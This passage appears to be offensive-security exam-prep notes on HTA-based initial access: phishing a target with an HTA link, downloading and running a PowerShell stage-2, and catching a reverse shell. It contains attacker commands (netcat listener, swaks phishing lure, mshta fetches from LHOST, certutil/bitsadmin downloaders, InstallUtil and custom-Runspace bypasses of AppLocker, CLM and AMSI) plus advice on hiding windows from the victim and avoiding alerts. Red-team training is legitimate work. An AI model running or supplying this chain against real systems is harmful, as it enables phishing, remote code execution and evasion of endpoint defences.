## Scenario 8: HTA download and execute together fail; split works

**Situation**: Target did open the HTA and did hit the download URL, but there is no final execution result — “split works, together does nothing.” Treat as a **timing and lifecycle** scenario; do not assume AV caused the failure.

**Assumptions**: HTA can fire (scenario 6/7 callback already proven); download URL was hit (web log has GET); the “single combined command” contains both download and execute. Likely cause classes: A) quotes/escapes in one command line eaten at the cmd layer (most common: outer `Run("...")` doubles + inner PowerShell quotes + `&` `|` `;` parsed as entities inside HTML attributes); B) first process has not finished writing the file when the second starts reading; C) mshta main window `self.close()` exits early and host job/window-station lifecycle takes long children with it; D) the long combined text triggers AMSI/AV static scan while short splits do not; E) newly written file is under realtime scan and the follow-on process cannot open it (race).

**Prepare (attacker side)**: put 3 files on the static server: `m02-hta-download-exec-split.hta`, the download source (`shell.ps1` or `stage2.ps1`), and `ok.txt` probe. Listen with `nc -lvnp LPORT`. **Also keep a terminal on `tail -f` of the web access log** — every conclusion in this scenario comes from log order, not guessing.

**Procedure**:
1. Gather evidence; answer four questions (check the web log line by line):
   1. Is there `GET /xxx.hta`? No → delivery/trigger problem, not the exec chain;
   2. Is there the HTA first-line echo (`/cb?stage=hta-start`)? No → JScript inside mshta never ran;
   3. Is there `GET /shell.ps1` (download action)? No → stage-1 command never reached download;
   4. Is there a callback? No, but 1–3 all yes → problem is “between download and execute,” i.e. A/B/C/E timing or lifecycle.
2. Run “split two stages” with `m02-hta-download-exec-split.hta`:
   - Stage 1: `WScript.Shell.Run(downloadCmd, 0, true)` — `true` means **wait for that process to exit**; after download, JScript checks file existence with `Scripting.FileSystemObject`, then echoes `GET /cb?stage=download-done`;
   - Stage 2: only after the file exists, `Run(execCmd, 0, true)`, then echo `GET /cb?stage=exec-done`.
   - Optionally insert 2–5 seconds of `WScript.Sleep` between them for realtime scanners/AV release windows (counter to B/E).
3. Map the log to a cause class, then fix:
   - Stage 1 echo fails → download command quotes/proxy (back to scenario 6 alts: `certutil`/`bitsadmin`, or explicit PowerShell proxy);
   - Stage 1 OK, stage 2 fails → exec path limited (CLM/AppLocker/AV exec path) — switch exec to scenario 7’s runner trigger (InstallUtil /U or custom Runspace IEX);
   - Both stages succeed alone, but one combined command fails → class A escape/parse or class C lifecycle: **stop trying one-liners**; stay two-stage; if a single file is required, put two `Run`s with `&&`/`;` in **one cmd string** with `start /wait` semantics each, and avoid nested quotes (Base64 the PowerShell with `-enc` so the command has one quote layer).
4. “Single-file version with completion checks” (prepare if the question requires it): in one `.hta`, two sequential `Run(..., 0, true)` — do not rely on children surviving after `self.close()`; echo progress points before key actions. Verify echo order in the web log matches code order.
5. Only when “logs show every stage succeeded, split succeeds, only merge fails” should AV/AMSI become a candidate — then retry with scenario 7 AMSI handling and shorter commands.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m02-hta-download-exec-split.hta` | Download/exec split + file-existence check + progress echoes | replace `LHOST`, `OUT` |
| `m02-hta-callback.hta` | Confirm HTA trigger and egress (first triage step) | replace `LHOST` |
| `m02-hta-powershell-stager.hta` | Control: one-step IEX (“merged” shape) | replace `LHOST` |

**Validation**: web log shows ordered echoes `hta-start → download-done → exec-done`; `nc` gets a callback. Side-by-side logs of “failed shape” vs “split shape” point at the broken stage; stable split success = problem located.

**Failure branches and alternatives**:
- If PowerShell download is blocked but browser/mshta egress is fine → switch downloader to `certutil -urlcache -split -f URL OUT` or `bitsadmin /transfer` (M10 download matrix applies).
- If exec fails because CLM makes `-File shell.ps1` useless → switch exec to InstallUtil/custom Runspace (scenario 7 chain); keep download split.
- If you suspect scan races → fixed `WScript.Sleep(2000~5000)` between stages, or poll until the file is readable then exec.
- If mshta `self.close()` takes children with it → launch exec via `schtasks` or `wmic process call create` to leave the host process tree (lifecycle fix; check AppLocker allowlists).

**Exam / OPSEC notes**: biggest pitfall is “swap AV bypasses without reading logs” and burning time — **echo first, conclude second**; split-stage echo points are triage evidence you can show on the exam; if a single-file merge must go to the user, keep the window minimized and close immediately so “download finished but window still open” is not noticed; prefer writing under `C:\Windows\Tasks` or `%TEMP%` to avoid protected-directory write alerts.

---

## Module quick reference

```bash
# ---- Attacker side ----
cd ~/osep/payloads/web && python3 -m http.server 80
nc -lvnp LPORT
# Mail lure (prefer link form):
swaks --body 'Please click here http://LHOST/stager.hta' \
  --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" \
  --header "Subject: issue" -t TARGET -f USER@example.com --server SMTP_SERVER

# ---- Compile runner (Windows build host; x64 and x86 each) ----
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo \
  /out:m02stage64.exe /r:System.Management.Automation.dll \
  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /nologo \
  /out:m02stage32.exe /r:System.Management.Automation.dll \
  /r:System.Configuration.Install.dll m02-clm-bypass-runspace.cs
# Optional: encode exe to text for download chains:
certutil -encode m02stage64.exe enc.txt

# ---- Target-side triggers ----
mshta.exe http://LHOST/m02-hta-callback.hta            # 1) confirm trigger
mshta.exe http://LHOST/m02-hta-powershell-stager.hta   # 2) no CLM → direct IEX
mshta.exe http://LHOST/m02-hta-embedded-clm-bypass.hta # 3) AppLocker+CLM+AMSI all on
mshta.exe http://LHOST/m02-hta-download-exec-split.hta # 4) timing triage

# ---- Decide whether to switch to the combined chain (in-session) ----
$ExecutionContext.SessionState.LanguageMode            # ConstrainedLanguage = CLM
Get-AppLockerPolicy -Effective                          # effective rules
Get-Process -Name powershell | % { $_.Modules | ? ModuleName -eq 'amsi.dll' }

# ---- Alternate trigger (no mshta) ----
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false /U C:\Windows\Tasks\m02stage64.exe
```

## Related script list

- `m02-hta-callback.hta` — minimal HTA callback (shared first step for scenarios 6/7/8)
- `m02-hta-powershell-stager.hta` — HTA→PowerShell IEX pull stage 2 (scenario 6; scenario 8 “merged” control)
- `m02-hta-download-exec-split.hta` — download/exec split + file check + progress echoes (scenario 8)
- `m02-hta-embedded-clm-bypass.hta` — embedded C# compile-now + InstallUtil /U + custom Runspace (scenario 7, single file)
- `m02-clm-bypass-runspace.cs` — InstallUtil-compatible runner: custom Runspace + AMSI handling + IEX (scenarios 6/7)
- `m02-clm-bypass-dotnettojscript.cs` — DotNetToJScript payload class; no EXE / no InstallUtil alternate (scenario 7)
